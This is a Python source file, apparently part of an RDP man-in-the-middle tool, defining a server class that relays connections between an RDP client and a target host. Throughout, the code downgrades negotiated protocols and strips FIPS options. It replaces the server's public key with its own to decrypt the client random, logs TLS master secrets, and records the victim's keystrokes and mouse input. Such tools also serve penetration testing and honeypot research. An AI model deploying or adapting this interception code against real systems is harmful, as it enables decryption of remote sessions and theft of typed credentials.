from Crypto.PublicKey import RSA

from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from rdpy.core import log
from rdpy.core.crypto import SecuritySettings, RC4CrypterProxy
from rdpy.enum.rdp import NegotiationProtocols, RDPDataPDUSubtype, InputEventType, RDPFastPathParserMode, \
    EncryptionMethod, EncryptionLevel
from rdpy.layer.mcs import MCSLayer
from rdpy.layer.rdp.data import RDPDataLayer
from rdpy.layer.rdp.licensing import RDPLicensingLayer
from rdpy.layer.rdp.security import createNonTLSSecurityLayer, TLSSecurityLayer
from rdpy.layer.tcp import TCPLayer
from rdpy.layer.tpkt import TPKTLayer, createFastPathParser
from rdpy.layer.x224 import X224Layer
from rdpy.mcs.channel import MCSChannelFactory, MCSServerChannel
from rdpy.mcs.server import MCSServerRouter
from rdpy.mcs.user import MCSUserObserver
from rdpy.mitm.client import MITMClient
from rdpy.mitm.observer import MITMSlowPathObserver, MITMFastPathObserver
from rdpy.parser.gcc import GCCParser
from rdpy.parser.rdp.client_info import RDPClientInfoParser
from rdpy.parser.rdp.connection import RDPClientConnectionParser, RDPServerConnectionParser
from rdpy.parser.rdp.negotiation import RDPNegotiationParser
from rdpy.pdu.gcc import GCCConferenceCreateResponsePDU
from rdpy.pdu.mcs import MCSConnectResponsePDU
from rdpy.pdu.rdp.connection import ProprietaryCertificate, ServerSecurityData, RDPServerDataPDU
from rdpy.pdu.rdp.negotiation import RDPNegotiationResponsePDU, RDPNegotiationRequestPDU
from rdpy.protocol.rdp.x224 import ServerTLSContext


class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
    def __init__(self, targetHost, targetPort, certificateFileName, privateKeyFileName):
        MCSUserObserver.__init__(self)
        self.targetHost = targetHost
        self.targetPort = targetPort
        self.clientConnector = None
        self.client = None
        self.originalNegotiationPDU = None
        self.targetNegotiationPDU = None
        self.serverData = None
        self.io = RDPDataLayer()
        self.securityLayer = None
        self.fastPathParser = None
        self.rc4RSAKey = RSA.generate(2048)
        self.securitySettings = SecuritySettings(SecuritySettings.Mode.SERVER)

        self.supportedChannels = []

        self.useTLS = False
        self.tcp = TCPLayer()
        self.tpkt = TPKTLayer()
        self.x224 = X224Layer()
        self.mcs = MCSLayer()
        self.router = MCSServerRouter(self.mcs, self)

        self.tcp.setNext(self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)

        self.tcp.createObserver(onConnection=self.onConnection, onDisconnection=self.onDisconnection)
        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest)
        self.mcs.setObserver(self.router)
        self.router.createObserver(
            onConnectionReceived = self.onConnectInitial,
            onDisconnectProviderUltimatum = self.onDisconnectProviderUltimatum,
            onAttachUserRequest = self.onAttachUserRequest,
            onChannelJoinRequest = self.onChannelJoinRequest
        )

        self.ioSecurityLayer = None
        self.licensingLayer = None
        self.certificateFileName = certificateFileName
        self.privateKeyFileName = privateKeyFileName
        self.gcc = GCCParser()
        self.rdpClientInfoParser = RDPClientInfoParser()
        self.rdpClientConnectionParser = RDPClientConnectionParser()
        self.rdpServerConnectionParser = RDPServerConnectionParser()
        self.rdpNegotiationParser = RDPNegotiationParser()

    def getProtocol(self):
        return self.tcp

    def getNegotiationPDU(self):
        return self.targetNegotiationPDU

    # Build protocol for the client side of the connection
    def buildProtocol(self, addr):
        self.client = MITMClient(self)
        return self.client.getProtocol()

    def logSSLParameters(self):
        log.get_ssl_logger().info(self.tpkt.previous.transport.protocol._tlsConnection.client_random(),
                                  self.tpkt.previous.transport.protocol._tlsConnection.master_key())

    def log_debug(self, string):
        log.debug("Server: %s" % string)

    def log_error(self, string):
        log.error("Server: %s" % string)

    # Connect the client side to the target machine
    def connectClient(self):
        self.clientConnector = reactor.connectTCP(self.targetHost, self.targetPort, self)

    # Connection sequence #0
    def onConnection(self):
        self.log_debug("TCP connected")

    def onDisconnection(self, reason):
        self.log_debug("Connection closed")

        if self.client:
            self.client.disconnect()

        self.disconnectConnector()

    def onDisconnectProviderUltimatum(self, pdu):
        self.log_debug("Disconnect Provider Ultimatum PDU received")
        self.disconnect()

    def disconnect(self):
        self.log_debug("Disconnecting")
        self.tcp.disconnect()
        self.disconnectConnector()

    def disconnectConnector(self):
        if self.clientConnector:
            self.clientConnector.disconnect()
            self.clientConnector = None

    # X224 Request
    def onConnectionRequest(self, pdu):
        self.log_debug("Connection Request received")

        # We need to save the original negotiation PDU because Windows will cut the connection if it sees that the requested protocols have changed.
        self.originalNegotiationPDU = self.rdpNegotiationParser.parse(pdu.payload)
        self.targetNegotiationPDU = RDPNegotiationRequestPDU(
            self.originalNegotiationPDU.cookie,
            self.originalNegotiationPDU.flags,

            # Only SSL is implemented, so remove other protocol flags
            self.originalNegotiationPDU.requestedProtocols & NegotiationProtocols.SSL
        )

        self.connectClient()

    # X224 Response
    def onConnectionConfirm(self, _):
        protocols = NegotiationProtocols.SSL if self.originalNegotiationPDU.tlsSupported else NegotiationProtocols.NONE
        payload = self.rdpNegotiationParser.write(RDPNegotiationResponsePDU(0x00, protocols))
        self.x224.sendConnectionConfirm(payload, source = 0x1234)

        if self.originalNegotiationPDU.tlsSupported:
            self.tcp.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName, certificateFileName=self.certificateFileName))
            self.useTLS = True

    # MCS Connect Initial
    def onConnectInitial(self, pdu):
        """
        Parse the ClientData PDU and send a ServerData PDU back.
        :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
        """
        self.log_debug("Connect Initial received")
        gccConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)

        # FIPS is not implemented, so remove this flag if it's set
        rdpClientDataPdu = self.rdpClientConnectionParser.parse(gccConferenceCreateRequestPDU.payload)
        rdpClientDataPdu.securityData.encryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS
        rdpClientDataPdu.securityData.extEncryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS

        self.client.onConnectInitial(gccConferenceCreateRequestPDU, rdpClientDataPdu)
        return True

    # MCS Connect Response
    def onConnectResponse(self, pdu, serverData):
        """
        :type pdu: MCSConnectResponsePDU
        :type serverData: RDPServerDataPDU
        """
        if pdu.result != 0:
            self.mcs.send(pdu)
            return

        # Replace the server's public key with our own key so we can decrypt the incoming client random
        cert = serverData.security.serverCertificate
        if cert:
            cert = ProprietaryCertificate(
                cert.signatureAlgorithmID,
                cert.keyAlgorithmID,
                cert.publicKeyType,
                self.rc4RSAKey,
                cert.signatureType,
                cert.signature,
                cert.padding
            )

        security = ServerSecurityData(
            # FIPS is not implemented so avoid using that
            serverData.security.encryptionMethod if serverData.security.encryptionMethod != EncryptionMethod.ENCRYPTION_FIPS else EncryptionMethod.ENCRYPTION_128BIT,
            serverData.security.encryptionLevel if serverData.security.encryptionLevel != EncryptionLevel.ENCRYPTION_LEVEL_FIPS else EncryptionLevel.ENCRYPTION_LEVEL_HIGH,
            serverData.security.serverRandom,
            cert
        )

        serverData.core.clientRequestedProtocols = self.originalNegotiationPDU.requestedProtocols
        serverData.network.channels = [0] * len(serverData.network.channels)

        self.securitySettings.serverSecurityReceived(security)
        self.serverData = RDPServerDataPDU(serverData.core, security, serverData.network)

        rdpParser = RDPServerConnectionParser()
        gccParser = GCCParser()

        gcc = self.client.conferenceCreateResponse
        gcc = GCCConferenceCreateResponsePDU(gcc.nodeID, gcc.tag, gcc.result, rdpParser.write(self.serverData))
        pdu = MCSConnectResponsePDU(pdu.result, pdu.calledConnectID, pdu.domainParams, gccParser.write(gcc))
        self.mcs.send(pdu)

    # MCS Attach User Request
    def onAttachUserRequest(self, _):
        self.client.onAttachUserRequest()

    # MCS Attach User Confirm successful
    def onAttachConfirmed(self, user):
        self.router.sendAttachUserConfirm(True, user.userID)

    # MCS Attach User Confirm failed
    def onAttachRefused(self, user, result):
        self.router.sendAttachUserConfirm(False, result)

    # MCS Channel Join Request
    def onChannelJoinRequest(self, pdu):
        self.client.onChannelJoinRequest(pdu)

    # MCS Channel Join Confirm successful
    def onChannelJoinAccepted(self, userID, channelID):
        self.router.sendChannelJoinConfirm(0, userID, channelID)

    # MCS Channel Join Confirm failed
    def onChannelJoinRefused(self, user, result, channelID):
        self.router.sendChannelJoinConfirm(result, user.userID, channelID)

    def buildChannel(self, mcs, userID, channelID):
        self.log_debug("building channel {} for user {}".format(channelID, userID))

        if channelID != self.serverData.network.mcsChannelID:
            return None
        else:
            encryptionMethod = self.serverData.security.encryptionMethod
            crypterProxy = RC4CrypterProxy()

            if self.useTLS:
                self.securityLayer = TLSSecurityLayer()
            else:
                self.securityLayer = createNonTLSSecurityLayer(encryptionMethod, crypterProxy)

            self.securitySettings.setObserver(crypterProxy)
            self.fastPathParser = createFastPathParser(self.useTLS, encryptionMethod, crypterProxy, RDPFastPathParserMode.SERVER)
            self.licensingLayer = RDPLicensingLayer()
            channel = MCSServerChannel(mcs, userID, channelID)

            channel.setNext(self.securityLayer)
            self.securityLayer.setLicensingLayer(self.licensingLayer)
            self.securityLayer.setNext(self.io)
            self.tpkt.setFastPathParser(self.fastPathParser)

            slowPathObserver = MITMSlowPathObserver(self.io, "Server")
            fastPathObserver = MITMFastPathObserver(self.tpkt, "Server")
            self.io.setObserver(slowPathObserver)
            self.tpkt.setObserver(fastPathObserver)
            self.securityLayer.createObserver(
                onClientInfoReceived = self.onClientInfoReceived,
                onSecurityExchangeReceived = self.onSecurityExchangeReceived
            )

            clientObserver = self.client.getChannelObserver(channelID)
            slowPathObserver.setPeer(clientObserver)
            fastPathObserver.setPeer(self.client.getFastPathObserver())

            slowPathObserver.setDataHandler(RDPDataPDUSubtype.PDUTYPE2_INPUT, self.onInputPDUReceived)

            if self.useTLS:
                self.securityLayer.securityHeaderExpected = True

            return channel

    # Security Exchange
    def onSecurityExchangeReceived(self, pdu):
        """
        :type pdu: RDPSecurityExchangePDU
        :return:
        """
        self.log_debug("Security Exchange received")
        clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.securitySettings.setClientRandom(clientRandom)

    # Client Info Packet
    def onClientInfoReceived(self, pdu):
        self.log_debug("Client Info received")
        self.client.onClientInfoReceived(pdu)

    def onLicensingPDU(self, pdu):
        self.log_debug("Sending Licensing PDU")
        self.securityLayer.securityHeaderExpected = False
        self.licensingLayer.sendPDU(pdu)

    def sendDisconnectProviderUltimatum(self, pdu):
        self.mcs.send(pdu)

    def onInputPDUReceived(self, pdu):
        for event in pdu.events:
            if event.messageType == InputEventType.INPUT_EVENT_SCANCODE:
                self.log_debug("Key pressed: 0x%2lx" % event.keyCode)
            elif event.messageType == InputEventType.INPUT_EVENT_MOUSE:
                self.log_debug("Mouse position: x = %d, y = %d" % (event.x, event.y))